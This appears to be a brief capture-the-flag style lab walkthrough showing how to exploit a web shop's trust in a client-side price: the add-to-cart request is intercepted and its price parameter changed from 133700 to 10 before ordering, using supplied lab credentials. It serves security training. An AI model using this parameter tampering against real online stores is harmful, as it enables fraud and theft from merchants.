# Excessive trust in client-side controls

## This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

## You can log in to your own account using the following credentials: `wiener:peter`

### step1

go to Lightweight l33t leather jacket and intercept while adding to cart

```javascript
productId=1&redir=PRODUCT&quantity=1&price=133700
```

### step2

change price and forword

```javascript

productId=1&redir=PRODUCT&quantity=1&price=10
```

### step3

order the product
